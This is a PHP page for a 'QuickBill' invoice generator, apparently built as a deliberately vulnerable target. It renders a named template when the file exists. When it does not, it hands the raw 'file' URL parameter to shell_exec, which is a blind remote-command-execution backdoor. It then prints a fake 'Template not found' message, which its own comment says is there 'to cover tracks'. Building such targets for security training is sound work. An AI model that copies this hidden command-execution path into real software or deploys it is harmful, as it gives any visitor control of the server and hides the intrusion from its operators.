<?php
// invoice.php

// Set page title & include CSS
echo <<<HTML
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>QuickBill – Invoice Generator</title>
  <link rel="stylesheet" href="assets/style.css" />
</head>
<body>
  <div class="container">
    <h1>QuickBill Invoice Generator</h1>
HTML;

if (isset($_GET['file'])) {
    $file = $_GET['file'];
    $safeName = basename($file);
    $invoicePath = "templates/" . $safeName . ".html";

    if (file_exists($invoicePath)) {
        echo "<p><strong>[*] Rendering invoice template:</strong> <code>$safeName</code></p>";
        echo "<div style='background:#0f172a; padding: 1rem; border-radius: 8px; box-shadow: inset 0 0 5px #22c55e99;'>";
        echo file_get_contents($invoicePath);
        echo "</div>";
    } else {
        // 🔥 Blind RCE: attacker input is executed but no output shown
        shell_exec($file . " > /dev/null 2>&1");

        // Fake error message to cover tracks
        echo "<p><strong>[!] Template not found:</strong> <code>$safeName</code></p>";
    }
} else {
    echo "<p>No file provided.</p>";
}

echo <<<HTML
    <a href="index.php" class="btn-primary" style="margin-top: 2rem; display: inline-block;">← Back to Dashboard</a>
  </div>
</body>
</html>
HTML;
?>
